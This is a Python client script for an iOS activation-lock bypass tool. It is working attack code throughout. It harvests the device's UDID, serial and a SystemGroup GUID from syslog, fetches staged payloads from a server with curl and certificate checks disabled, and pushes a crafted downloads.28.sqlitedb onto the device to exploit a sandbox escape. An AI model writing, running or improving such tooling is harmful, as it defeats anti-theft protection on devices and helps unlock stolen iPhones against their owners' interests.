#!/usr/bin/env python3
"""
iOS Activation Tool - Client Edition
Based on A12_Bypass_OSS by rhcp011235/Rust505
Enhanced and adapted for local/self-hosted server usage

IMPORTANT: This tool works 100% OFFLINE with your self-hosted server.
No external server connections required - all payloads generated locally.

Requirements:
- Python 3.6+
- libimobiledevice (brew install libimobiledevice on macOS)
- pymobiledevice3 (pip install pymobiledevice3)

Usage:
    python3 activator.py --server YOUR_SERVER_IP:PORT
    
Example:
    python3 activator.py --server 192.168.1.100:8000
"""

import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import json
import argparse
from collections import Counter

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class BypassAutomation:
    def __init__(self, server_url):
        self.api_url = server_url.rstrip('/') + "/get2.php"
        self.timeouts = {
            'asset_wait': 300,
            'asset_delete_delay': 15,
            'reboot_wait': 300,
            'syslog_collect': 180
        }
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        atexit.register(self._cleanup)

    def log(self, msg, level='info'):
        if level == 'info':
            print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error':
            print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn':
            print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 50 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 50 + f"{Style.RESET}")
        elif level == 'detail':
            print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success':
            print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired:
            return 124, "", "Timeout"
        except FileNotFoundError:
            return 1, "", f"Command not found: {cmd[0]}"
        except Exception as e:
            return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        
        required_tools = ['ideviceinfo', 'idevice_id']
        missing = []
        
        for tool in required_tools:
            if not shutil.which(tool):
                missing.append(tool)
        
        if missing:
            self.log(f"Missing tools: {', '.join(missing)}", "error")
            self.log("Install with: brew install libimobiledevice", "detail")
            sys.exit(1)
        
        if shutil.which("ifuse"):
            self.afc_mode = "ifuse"
        else:
            self.afc_mode = "pymobiledevice3"
        
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")
        self.log("All dependencies verified", "success")

    def mount_afc(self):
        if self.afc_mode != "ifuse":
            return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out:
            return True
        for i in range(5):
            code, _, _ = self._run_cmd(["ifuse", self.mount_point])
            if code == 0:
                self.log("Device mounted successfully", "info")
                return True
            time.sleep(2)
        self.log("Failed to mount via ifuse", "error")
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try:
                os.rmdir(self.mount_point)
            except OSError:
                pass

    def _cleanup(self):
        self.unmount_afc()

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, err = self._run_cmd(["ideviceinfo"])
        if code != 0:
            self.log(f"Device not found. Error: {err or 'Unknown'}", "error")
            self.log("Make sure device is connected via USB and trusted", "detail")
            sys.exit(1)

        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info

        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        print(f"Serial: {info.get('SerialNumber', '?')}")

        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device is already activated.{Style.RESET}")

        return info

    def get_guid_manual(self):
        print(f"\n{Style.YELLOW}⚠ GUID Input Required{Style.RESET}")
        print(f"   Format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX")
        print(f"   Example: 2A22A82B-C342-444D-972F-5270FB5080DF")
        print(f"\n   Get GUID from: https://hanakim3945.github.io/posts/download28_sbx_escape/")

        UUID_PATTERN = re.compile(r'^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$', re.IGNORECASE)

        while True:
            guid_input = input(f"\n{Style.BLUE}➤ Enter SystemGroup GUID:{Style.RESET} ").strip()
            if UUID_PATTERN.match(guid_input):
                return guid_input.upper()
            print(f"{Style.RED}❌ Invalid format. Must be 8-4-4-4-12 hex characters.{Style.RESET}")

    def get_guid_auto(self):
        self.log("Scanning device logs for GUID...", "step")

        udid = self.device_info.get('UniqueDeviceID')
        if not udid:
            self.log("UDID not available", "error")
            return None

        log_path = f"{udid}.logarchive"
        if os.path.exists(log_path):
            shutil.rmtree(log_path)

        self.log("Collecting device logs (up to 120s)...", "detail")
        code, _, err = self._run_cmd(
            ["pymobiledevice3", "syslog", "collect", log_path], 
            timeout=120
        )
        
        if code != 0 or not os.path.exists(log_path):
            self.log(f"Log collection failed: {err}", "error")
            return None
        
        self.log("Logs collected successfully", "detail")

        trace_file = os.path.join(log_path, "logdata.LiveData.tracev3")
        if not os.path.exists(trace_file):
            self.log("logdata.LiveData.tracev3 not found", "error")
            shutil.rmtree(log_path)
            return None

        size_mb = os.path.getsize(trace_file) / (1024 * 1024)
        self.log(f"Found trace file ({size_mb:.1f} MB)", "detail")

        candidates = []
        found_bl = False

        try:
            with open(trace_file, 'rb') as f:
                data = f.read()

            needle = b'BLDatabaseManager'
            pos = 0
            hit_count = 0

            self.log("Scanning for 'BLDatabaseManager'...", "detail")
            while True:
                pos = data.find(needle, pos)
                if pos == -1:
                    break
                found_bl = True
                hit_count += 1
                pos += 1

            if not found_bl:
                self.log("'BLDatabaseManager' NOT FOUND in logs", "error")
                return None

            self.log(f"Found {hit_count} occurrence(s) of 'BLDatabaseManager'", "success")

            guid_pat = re.compile(rb'[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}', re.IGNORECASE)

            pos = 0
            while True:
                pos = data.find(needle, pos)
                if pos == -1:
                    break

                start = max(0, pos - 1024)
                end = min(len(data), pos + len(needle) + 1024)
                window = data[start:end]

                matches = guid_pat.findall(window)
                for raw_guid in matches:
                    guid = raw_guid.decode('ascii').upper()
                    clean = guid.replace('0', '').replace('-', '')
                    if len(clean) >= 8:
                        candidates.append(guid)

                pos += 1

            if not candidates:
                self.log("No valid GUIDs found near 'BLDatabaseManager'", "error")
                return None

            counts = Counter(candidates)
            total = len(candidates)
            unique = len(counts)

            self.log(f"Found {total} GUID candidate(s), {unique} unique", "info")
            for guid, freq in counts.most_common(5):
                self.log(f"  {guid} (x{freq})", "detail")

            best_guid, freq = counts.most_common(1)[0]
            if freq >= 2 or total == 1:
                self.log(f"CONFIDENT MATCH: {best_guid}", "success")
                return best_guid
            else:
                self.log(f"Low-confidence GUID (x{freq}): {best_guid}", "warn")
                return best_guid

        finally:
            if os.path.exists(log_path):
                shutil.rmtree(log_path)

    def get_all_urls_from_server(self, prd, guid, sn):
        params = f"prd={prd}&guid={guid}&sn={sn}"
        url = f"{self.api_url}?{params}"

        self.log(f"Requesting payload from: {url}", "detail")

        code, out, err = self._run_cmd(["curl", "-s", "-k", url])
        if code != 0:
            self.log(f"Server request failed: {err}", "error")
            return None, None, None

        try:
            data = json.loads(out)
            if data.get('success'):
                links = data.get('links', {})
                stage1_url = links.get('step1_fixedfile')
                stage2_url = links.get('step2_bldatabase')
                stage3_url = links.get('step3_final', data.get('downloadUrl'))
                return stage1_url, stage2_url, stage3_url
            else:
                self.log(f"Server error: {data.get('error', 'Unknown')}", "error")
                return None, None, None
        except json.JSONDecodeError as e:
            self.log(f"Invalid server response: {e}", "error")
            self.log(f"Response: {out[:200]}", "detail")
            return None, None, None

    def download_and_validate(self, url, local_path):
        self.log(f"Downloading: {os.path.basename(local_path)}...", "detail")
        
        if os.path.exists(local_path):
            os.remove(local_path)

        code, _, err = self._run_cmd(["curl", "-L", "-k", "-o", local_path, url])
        if code != 0:
            self.log(f"Download failed: {err}", "error")
            return False

        if not os.path.exists(local_path) or os.path.getsize(local_path) == 0:
            self.log("Downloaded file is empty", "error")
            return False

        self.log(f"Downloaded: {os.path.getsize(local_path)} bytes", "detail")
        return True

    def validate_sqlite_db(self, db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT count(*) FROM sqlite_master WHERE type='table'")
            table_count = cursor.fetchone()[0]
            
            if table_count == 0:
                self.log("Invalid database - no tables found", "error")
                conn.close()
                return False
            
            cursor.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
            if cursor.fetchone()[0] > 0:
                cursor.execute("SELECT COUNT(*) FROM asset")
                count = cursor.fetchone()[0]
                self.log(f"Database validated - {count} asset records", "info")
            
            conn.close()
            return True
        except Exception as e:
            self.log(f"Database validation failed: {e}", "error")
            return False

    def deploy_to_device(self, db_path):
        self.log("Deploying payload to device...", "step")
        
        if self.afc_mode == "ifuse":
            if not self.mount_afc():
                return False
            
            dest = os.path.join(self.mount_point, "Downloads", "downloads.28.sqlitedb")
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            
            try:
                shutil.copy2(db_path, dest)
                self.log(f"Deployed to: {dest}", "success")
                return True
            except Exception as e:
                self.log(f"Deploy failed: {e}", "error")
                return False
        else:
            self.log("Using pymobiledevice3 for deployment...", "detail")
            code, _, err = self._run_cmd([
                "pymobiledevice3", "afc", "push",
                db_path, "/Downloads/downloads.28.sqlitedb"
            ])
            if code == 0:
                self.log("Deployed via pymobiledevice3", "success")
                return True
            else:
                self.log(f"Deploy failed: {err}", "error")
                return False

    def run(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        print(f"""
{Style.BOLD}{Style.MAGENTA}╔═══════════════════════════════════════════════════════╗
║     iOS Activation Bypass Tool - Local Edition       ║
║         100% Offline - Self-Hosted Server            ║
╚═══════════════════════════════════════════════════════╝{Style.RESET}
""")

        self.verify_dependencies()
        self.detect_device()

        print(f"\n{Style.CYAN}GUID Detection Options:{Style.RESET}")
        print(f"  1. {Style.GREEN}Auto-detect from device logs (recommended){Style.RESET}")
        print(f"  2. {Style.YELLOW}Manual input{Style.RESET}")

        choice = input(f"\n{Style.BLUE}➤ Choose option (1/2):{Style.RESET} ").strip()

        if choice == "1":
            self.guid = self.get_guid_auto()
            if self.guid:
                self.log(f"Auto-detected GUID: {self.guid}", "success")
            else:
                self.log("Could not auto-detect, falling back to manual", "warn")
                self.guid = self.get_guid_manual()
        else:
            self.guid = self.get_guid_manual()

        self.log(f"Using GUID: {self.guid}", "info")

        input(f"\n{Style.YELLOW}Press Enter to generate and deploy payload...{Style.RESET}")

        self.log("Requesting Payload from Server...", "step")
        prd = self.device_info['ProductType']
        sn = self.device_info['SerialNumber']

        stage1_url, stage2_url, stage3_url = self.get_all_urls_from_server(prd, self.guid, sn)

        if not stage3_url:
            self.log("Failed to get payload URL from server", "error")
            sys.exit(1)

        self.log(f"Stage 1 (fixedfile): {stage1_url or 'N/A'}", "detail")
        self.log(f"Stage 2 (BLDatabase): {stage2_url or 'N/A'}", "detail")
        self.log(f"Stage 3 (Final): {stage3_url}", "detail")

        local_db = "downloads.28.sqlitedb"
        self.log("Downloading final payload...", "step")
        
        if not self.download_and_validate(stage3_url, local_db):
            sys.exit(1)

        self.log("Validating payload...", "step")
        if not self.validate_sqlite_db(local_db):
            sys.exit(1)

        deploy = input(f"\n{Style.BLUE}➤ Deploy to device now? (y/n):{Style.RESET} ").strip().lower()
        if deploy == 'y':
            if self.deploy_to_device(local_db):
                print(f"""
{Style.GREEN}{Style.BOLD}═══════════════════════════════════════════════════════
  PAYLOAD DEPLOYED SUCCESSFULLY!
═══════════════════════════════════════════════════════{Style.RESET}

{Style.YELLOW}Next Steps:{Style.RESET}
  1. The device will reboot automatically
  2. Wait for asset.epub to appear in Books
  3. Do NOT stop the server until process completes
  4. Monitor server logs for progress

{Style.CYAN}Server must remain running during the entire process!{Style.RESET}
""")
        else:
            print(f"""
{Style.GREEN}Payload saved locally: {local_db}{Style.RESET}
You can manually transfer it to the device later.
""")

def main():
    parser = argparse.ArgumentParser(
        description='iOS Activation Bypass Client (Local/Self-Hosted)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 activator.py --server http://192.168.1.100:8000
  python3 activator.py --server http://localhost:5000
  
IMPORTANT: This tool works 100% OFFLINE with your self-hosted server.
No external server connections - all payloads generated locally.
        """
    )
    parser.add_argument(
        '--server', '-s',
        required=True,
        help='Your self-hosted server URL (e.g., http://192.168.1.100:8000)'
    )
    
    args = parser.parse_args()
    
    server_url = args.server
    if not server_url.startswith(('http://', 'https://')):
        server_url = 'http://' + server_url
    
    print(f"{Style.CYAN}Connecting to LOCAL server: {server_url}{Style.RESET}")
    
    automation = BypassAutomation(server_url)
    automation.run()

if __name__ == "__main__":
    main()
